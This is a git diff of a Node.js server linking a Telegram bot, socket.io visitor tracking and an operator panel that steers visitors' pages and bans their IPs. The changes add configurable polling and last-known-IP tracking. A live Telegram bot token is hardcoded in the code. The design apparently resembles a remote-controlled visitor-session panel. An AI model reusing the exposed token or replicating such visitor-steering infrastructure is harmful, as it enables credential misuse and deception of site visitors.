@@ -17,7 +17,32 @@ const server = http.createServer(app);
 
 /** Set TELEGRAM_WEBHOOK_URL (full https URL to /telegram-webhook on your server) to use webhooks instead of polling — lower latency, better on mobile Telegram. */
 const TELEGRAM_WEBHOOK_URL = process.env.TELEGRAM_WEBHOOK_URL;
-const bot = new TelegramBot('8499303373:AAHXoK6a9_4o018qmbkPcYV3hdMt2dA-npM', { polling: !TELEGRAM_WEBHOOK_URL });
+/** Only one process may poll getUpdates per bot token. Set TELEGRAM_POLLING=0 to disable polling (e.g. another server handles updates). */
+const TELEGRAM_POLLING_ENABLED =
+  process.env.TELEGRAM_POLLING !== '0' && process.env.TELEGRAM_POLLING !== 'false';
+const usePolling = TELEGRAM_POLLING_ENABLED && !TELEGRAM_WEBHOOK_URL;
+const bot = new TelegramBot('8499303373:AAHXoK6a9_4o018qmbkPcYV3hdMt2dA-npM', { polling: usePolling });
+
+if (usePolling) {
+  let polling409Logged = false;
+  bot.on('polling_error', (err) => {
+    const msg = err && err.message ? String(err.message) : String(err);
+    if (msg.includes('409') || msg.includes('Conflict')) {
+      if (!polling409Logged) {
+        polling409Logged = true;
+        console.error(
+          'Telegram: stopped polling — another getUpdates client is using this bot token. ' +
+            'Run only one server process, or set TELEGRAM_WEBHOOK_URL on production and TELEGRAM_POLLING=0 elsewhere.'
+        );
+      }
+      try {
+        bot.stopPolling();
+      } catch (_) {
+        /* ignore */
+      }
+    }
+  });
+}
 
 const SESSION_MAX_AGE_SHORT_MS = 24 * 60 * 60 * 1000;
 const SESSION_MAX_AGE_LONG_MS = 10 * 365 * 24 * 60 * 60 * 1000;
@@ -85,6 +110,8 @@ function requirePanelAuth(req, res, next) {
 
 const BAN_LIST_FILE = path.join(__dirname, 'ban_ips.txt');
 const bannedIpSet = new Set();
+/** Last seen IP per clientId (survives disconnect / panel TTL so Ban IP from Telegram still works). */
+const lastKnownIpByClientId = new Map();
 
 function loadBanListIntoMemory() {
   bannedIpSet.clear();
@@ -207,11 +234,17 @@ bot.on('callback_query', (query) => {
         (delivered ? '' : '\n\n⚠️ Client offline — no open browser session for this ID.');
       sendTelegramMessage(msg, clientId, true);
     } else if (command === 'ban_ip') {
-      const ip = userData[clientId]?.ip;
+      const ip = userData[clientId]?.ip || lastKnownIpByClientId.get(clientId);
       if (ip) {
         banIp(ip);
         disconnectClient(clientId);
         sendTelegramMessage(`🚫 *IP Banned*\n\n🆔 *Client ID:* \`${clientId}\`\n🌍 *IP:* \`${ip}\``, clientId, false);
+      } else {
+        sendTelegramMessage(
+          `⚠️ *Ban IP failed*\n\nNo IP on record for client \`${clientId}\`. They may have never fully connected.`,
+          clientId,
+          false
+        );
       }
     }
   } catch (err) {
@@ -262,6 +295,7 @@ function registerVisitorSession(socket, clientId, clientIP, userAgent, timestamp
     : (userData[clientId]?.action ?? null);
 
   const isNewUser = !userData[clientId];
+  lastKnownIpByClientId.set(clientId, clientIP);
   userData[clientId] = {
     ...(userData[clientId] || {}),
     id: clientId,
@@ -372,6 +406,7 @@ io.on('connection', async (socket) => {
     const pageFromClient = data && data.page != null && String(data.page).trim() !== '' ? String(data.page).trim() : null;
     const resolvedPage = pageFromClient || initialPageFromQuery || null;
 
+    lastKnownIpByClientId.set(cid, clientIP);
     if (!userData[cid]) {
       userData[cid] = {
         id: cid,
@@ -480,7 +515,7 @@ io.of('/panel').on('connection', (socket) => {
     sendTelegramMessage(`🔌 *Client Forcefully Disconnected*\n\n🆔 *Client ID:* \`${clientId}\`\n🔄 Triggered from Panel`, clientId, true);
   });
   socket.on('ban-ip', (clientId) => {
-    const ip = userData[clientId]?.ip;
+    const ip = userData[clientId]?.ip || lastKnownIpByClientId.get(clientId);
     if (ip) {
       banIp(ip);
       disconnectClient(clientId);
@@ -594,11 +629,14 @@ const PORT = Number(process.env.PORT) || 3001;
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
   if (TELEGRAM_WEBHOOK_URL) {
-    bot.deleteWebHook()
+    bot
+      .deleteWebHook()
       .then(() => bot.setWebHook(TELEGRAM_WEBHOOK_URL))
       .then(() => console.log('Telegram webhook registered:', TELEGRAM_WEBHOOK_URL))
       .catch((err) => console.error('Telegram setWebHook failed:', err));
-  } else {
+  } else if (usePolling) {
     bot.deleteWebHook().then(() => console.log('Telegram long polling active'));
+  } else {
+    console.log('Telegram: polling disabled (TELEGRAM_POLLING=0); use TELEGRAM_WEBHOOK_URL or enable polling on one process only.');
   }
 });
